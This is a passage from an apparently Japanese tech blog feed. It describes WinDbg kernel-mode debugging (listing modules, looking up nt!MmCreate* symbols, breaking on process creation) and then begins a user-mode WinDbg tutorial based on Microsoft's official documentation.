&lt;h3 id=&quot;カーネルモードデバッグでモジュール一覧を表示する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%A7%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E4%B8%80%E8%A6%A7%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B&quot; aria-label=&quot;カーネルモードデバッグでモジュール一覧を表示する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルモードデバッグでモジュール一覧を表示する&lt;/h3&gt;
&lt;p&gt;カーネルモードデバッグの場合でも、Commandウィンドウから行う基本的な操作は、&lt;a href=&quot;/windows-windbg-002-tutorial&quot;&gt;こちらの記事&lt;/a&gt;で紹介したユーザモードデバッグとほぼ同一です。&lt;/p&gt;
&lt;p&gt;試しに、&lt;code class=&quot;language-text&quot;&gt;lm&lt;/code&gt;コマンドを実行して読み込まれているモジュールの一覧を出力してみました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1d792de8449ddeac48b488e2dd683b09/1134b/image-12.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 77.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB9ElEQVQ4y62TaXObQAyG+f9/qtNPPdIG2OVawuX6xE7ABgzG11tpfYzTZuqmU808s9ICL9JKa1jSw8Oj1AhXwRQBvpkubCeEG2ZwgggqzhASKrohvoHi4CmF8kMYHz6Z+PhF4LOlYKsB5NOQGEGEQ5hBBksz0M8c2j89/x0nGuHhqw0jjkIMshT5bIri5RnVaol+02G37YHjAdou6x0rVxUMpRSyLEOapphOp8jzHIvFAquqQtu2OBxOYsfjkXzi+Abnd/LFM4zRaKTFkiShNUNCflEU2O126LoOm83mKvgn2OYs+EJlclaTyYTWGRbzuRZsmkYL9n2Pv7WqWcNI4hjD4RBlWaIol3QONeq6RkUlM5zhfr/XGf/Kdru9wnHTdjCiKEJM5WZJhGS6QjavdZNYhM+GM+QPeGX4B5eY/QscVzVlaNs2PM+HFBa8wQuS2Qqh72J/OOC9tm43MBxHIggUfFfC/1HAH9c0qIkum7O814zbppwFHRIM4JFgNC4QTip4KsJ6vdYlv0+QzlDKU4aeIxCOl0jzGpHy8S/Wdj0MIQSdoQdXCrjxBDKZ0Z30aHTKV92+B1+Cckk3paGPeN544wKXy7zydXzmvHcLd1qPDf6zGUI6cFwP8g2u+w75NFqeH2jYt2yJR9M+YdmwhcR3U+AnWWa+Jd832uIAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/1d792de8449ddeac48b488e2dd683b09/8ac56/image-12.webp 240w,
/static/1d792de8449ddeac48b488e2dd683b09/d3be9/image-12.webp 480w,
/static/1d792de8449ddeac48b488e2dd683b09/e46b2/image-12.webp 960w,
/static/1d792de8449ddeac48b488e2dd683b09/f992d/image-12.webp 1440w,
/static/1d792de8449ddeac48b488e2dd683b09/bb6b4/image-12.webp 1470w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/1d792de8449ddeac48b488e2dd683b09/8ff5a/image-12.png 240w,
/static/1d792de8449ddeac48b488e2dd683b09/e85cb/image-12.png 480w,
/static/1d792de8449ddeac48b488e2dd683b09/d9199/image-12.png 960w,
/static/1d792de8449ddeac48b488e2dd683b09/07a9c/image-12.png 1440w,
/static/1d792de8449ddeac48b488e2dd683b09/1134b/image-12.png 1470w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/1d792de8449ddeac48b488e2dd683b09/d9199/image-12.png&quot;
            alt=&quot;image-12.png&quot;
            title=&quot;image-12.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;続いて、&lt;code class=&quot;language-text&quot;&gt;x nt!MmCreate*&lt;/code&gt;を実行して、ntモジュールのいくつかのシンボル一覧を取得します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;kd&gt; x nt!MmCreate*
fffff803`52bd46ac nt!MmCreateTeb &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MmCreateTeb&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
fffff803`52c5733c nt!MmCreatePeb &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MmCreatePeb&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
fffff803`528ecfb8 nt!MmCreateMdl &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MmCreateMdl&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
fffff803`528a5fc8 nt!MmCreateSystemSection &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MmCreateSystemSection&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
fffff803`52c08c40 nt!MmCreateSection &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MmCreateSection&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
fffff803`52c4a2fc nt!MmCreateProcessAddressSpace &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MmCreateProcessAddressSpace&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
fffff803`52c08d30 nt!MmCreateCacheManagerSection &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MmCreateCacheManagerSection&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
fffff803`52c88c8c nt!MmCreateSpecialImageSection &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MmCreateSpecialImageSection&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
fffff803`5281cda0 nt!MmCreateKernelStack &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MmCreateKernelStack&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
fffff803`52e2e838 nt!MmCreateMirror &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MmCreateMirror&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;カーネルモジュールにブレークポイントを設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%81%AB%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;カーネルモジュールにブレークポイントを設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルモジュールにブレークポイントを設定する&lt;/h3&gt;
&lt;p&gt;次に、&lt;code class=&quot;language-text&quot;&gt;bu nt!MmCreateProcessAddressSpace&lt;/code&gt;を実行し、ブレークポイントを設定します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;kd&gt; bu nt!MmCreateProcessAddressSpace
kd&gt; bl
     0 e Disable Clear  fffff803`52c4a2fc     0001 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0001&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; nt!MmCreateProcessAddressSpace&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで&lt;code class=&quot;language-text&quot;&gt;g&lt;/code&gt;コマンドを実行してWindowsカーネルの実行を再開すると、新しいプロセスが起動するごとに設定したブレークポイント設定により、その都度カーネルが停止し、WinDbgによるデバッグモードに移行します。&lt;/p&gt;
&lt;p&gt;例えば、今回はターゲットマシン環境でMicrosoft Edgeアプリケーションを起動してみました。
すると、新たなプロセス起動時の処理で&lt;code class=&quot;language-text&quot;&gt;nt!MmCreateProcessAddressSpace&lt;/code&gt;が呼び出されたため、カーネルが停止し、WinDbgでのデバッグが可能になります。&lt;/p&gt;
&lt;p&gt;ここから、WinDbgによりWindowsカーネルの処理をステップ実行したり、スタックトレースを参照したり、レジストリの情報を書き換えたり、といった操作が可能になります。&lt;/p&gt;
&lt;p&gt;以下の画像は、Microsoft Edgeの起動中の状態までステップ実行し、スタックトレースを出力した状態の画像です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4971cbcbb8730b99f99fd16584f1a897/0b533/image-15.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 65.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAADCElEQVQ4y32Sa2hTZxjHX9aKOrygHQ76XfwgXkA7cIidNa013ot2Tu2F2mlTp9YLVRHRwawtVhG8tV5WrZPJsurWffLzGCKbdDPNSZpLkxMTk5MmNuklvfe395z4QVF84M/7f98DP57/cx7xT0cHXS4vnUoXTpcHxeHGLuWQb/rd7fV9UF3y26uwhqW6BiGmMnX6XDIyP0U8ffY3iqsbh7sbj+8lXjVIIKQR0uJoscQb9b7l0wpHXzMwNMp3h2olcCYzZmUzTUKF0+kgEFB5FQoRjWr0RKOMDA8xPj7Gx2pyctI4Dx87JYEZiE/myHM6Qg0ECIfD+P1+VFUlHImQSqUYGh5mdHRUaozhN35iYuI98C/W39lVso/KfQcpr6hCKIpCMBgkIkHxeJxEIkFvby+vpfS6fd+KubiSbeXV5Jq/oWBrGWuLKigotlCwfS/rd1SxZdd+Nu+0sLnkAKLb5yfZn6K/v5+RkREZddzoJpUaMoAn65sRs5ZiqmrAcvUJpfVtlDY8pqzxD8outFPS0MbuOqt8e8TsxRsRHS/sRDWNZF+fAdPj6TU2no539k47YsEGltX+xiZrisK7EQrvRTG3apjvR1jXmtaGn+N8bj6B+NfmQPX7jPnpkfX4uk8kkwbw+yt3JdDMoiNtrG0JknfdxZomD6uuu/nqhtvwefLMv+Una2s94j+bQigURJNdDg4OGlBdAwODBrDu4jUysnMk8FfZWVgC3OTe8LL/UZCvf1INb2r2UnBH5bONZxHPnr/A3mnDZrMZnTmdTlwulzFTvX641ISYt4RFNQ/fAVZaX7Kt1S+7fAu45TzCrjiJxWLyL8sd7ImRlFH1TvXV0etc4xWmzFvI4kMPjFnpwPybXgmVUWVc3ZuaPWmgWe6kpkU/usCXr7WQOWc+86taMN3rMbrLbfKx+qbK6ltq+mz2s+bHEFm5FsRffz7FYe+iU87S3ulAkV6/697r8XH6TB05X+axfk8tRUcayf/2DPnVdawsPc4XxYdZvr2GnOKjrNh9ghxTEf8DP8EcKp4eO4EAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4971cbcbb8730b99f99fd16584f1a897/8ac56/image-15.webp 240w,
/static/4971cbcbb8730b99f99fd16584f1a897/d3be9/image-15.webp 480w,
/static/4971cbcbb8730b99f99fd16584f1a897/b0a15/image-15.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4971cbcbb8730b99f99fd16584f1a897/8ff5a/image-15.png 240w,
/static/4971cbcbb8730b99f99fd16584f1a897/e85cb/image-15.png 480w,
/static/4971cbcbb8730b99f99fd16584f1a897/0b533/image-15.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4971cbcbb8730b99f99fd16584f1a897/0b533/image-15.png&quot;
            alt=&quot;image-15.png&quot;
            title=&quot;image-15.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回は、WinDbgを用いたカーネルデバッグの設定方法と、簡単な操作について紹介しました。&lt;/p&gt;
&lt;p&gt;実際にカーネルデバッグを用いてトラブルシューティングを行うテクニックについては、また違う記事でまとめていく予定です。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開しているその他情報については、以下のページのリストをご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[WinDbgのユーザモードデバッグチュートリアルを試してみた]]></title><link>https://kashiwaba-yuki.com/windows-windbg-002-tutorial</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-002-tutorial</guid><pubDate>Tue, 05 Oct 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;WinDbgによるWindowsデバッグやダンプ解析によるトラブルシューティングに習熟することを目指しています。&lt;/p&gt;
&lt;p&gt;今回はとりあえず公式チュートリアル内の手順を再現して、WinDbgによるユーザモードプロセスのデバッグについて試してみました。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開している情報については、以下のページに一覧をまとめているので、よければご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この記事では以下の内容についてまとめています。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#widbg%E3%81%A8%E3%81%AF&quot;&gt;WiDbgとは&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#windbg%E3%83%81%E3%83%A5%E3%83%BC%E3%83%88%E3%83%AA%E3%82%A2%E3%83%AB&quot;&gt;WinDbgチュートリアル&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E7%92%B0%E5%A2%83&quot;&gt;今回使用する環境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#notepadexe%E3%81%AE%E8%B5%B7%E5%8B%95&quot;&gt;Notepad.exeの起動&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%91%E3%82%B9%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%81%A8%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BF&quot;&gt;シンボルパスの設定と読み込み&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E4%B8%80%E8%A6%A7%E3%81%AE%E5%87%BA%E5%8A%9B&quot;&gt;シンボル一覧の出力&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;ブレークポイントの設定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#notepadexe%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B&quot;&gt;Notepad.exeを実行する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AB%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BE%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%82%B3%E3%83%BC%E3%83%89%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%81%AE%E4%B8%80%E8%A6%A7%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B&quot;&gt;プロセスに読み込まれているコードモジュールの一覧を表示する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B&quot;&gt;スタックトレースを表示する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#notepadexe%E3%82%92%E5%86%8D%E9%96%8B%E3%81%99%E3%82%8B&quot;&gt;Notepad.exeを再開する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E6%9B%B8%E3%81%8D%E8%BE%BC%E3%81%BF%E6%99%82%E3%81%AB%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%82%92%E5%81%9C%E6%AD%A2%E3%81%99%E3%82%8B&quot;&gt;ファイル書き込み時にプロセスを停止する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E5%86%85%E3%81%AE%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E4%B8%80%E8%A6%A7%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B&quot;&gt;プロセス内のスレッド一覧を表示する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%89%B9%E5%AE%9A%E3%81%AE%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%81%AE%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;特定のスレッドのスタックトレースを取得する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%82%92%E7%B5%82%E4%BA%86%E3%81%97%E3%81%A6%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%8B%E3%82%89%E3%83%87%E3%82%BF%E3%83%83%E3%83%81%E3%81%99%E3%82%8B&quot;&gt;デバッグを終了して、プロセスからデタッチする&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;widbgとは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#widbg%E3%81%A8%E3%81%AF&quot; aria-label=&quot;widbgとは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WiDbgとは&lt;/h2&gt;
&lt;p&gt;Windows環境のデバッグやトラブルシューティングに使用するツールです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/getting-started-with-windows-debugging&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windows のデバッグの概要 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;WinDbgは、主に以下の用途に利用されます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windowsメモリダンプやプロセスダンプの解析&lt;/li&gt;
&lt;li&gt;カーネルモードのライブデバッグ&lt;/li&gt;
&lt;li&gt;ユーザモードのライブデバッグ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;MicrosoftのWindows開発チームも使用している公式のデバッガです。&lt;/p&gt;
&lt;p&gt;VisualStudioデバッガとの違いとして、WinDbgはカーネルモードのデバッグやスレッドスタックの分析まで実現することができます。&lt;/p&gt;
&lt;h2 id=&quot;windbgチュートリアル&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%83%81%E3%83%A5%E3%83%BC%E3%83%88%E3%83%AA%E3%82%A2%E3%83%AB&quot; aria-label=&quot;windbgチュートリアル permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgチュートリアル&lt;/h2&gt;
&lt;p&gt;WinDbgのはじめの一歩として、&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/getting-started-with-windbg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;公式ドキュメントのチュートリアル&lt;/a&gt;を実践していきます。&lt;/p&gt;
&lt;p&gt;このチュートリアルでは、WinDbgを使用してユーザモードのプロセスにアタッチし、デバッグを行います。&lt;/p&gt;
&lt;h3 id=&quot;今回使用する環境&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E7%92%B0%E5%A2%83&quot; aria-label=&quot;今回使用する環境 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;今回使用する環境&lt;/h3&gt;
&lt;p&gt;今回使用している環境は以下の環境です。&lt;/p&gt;
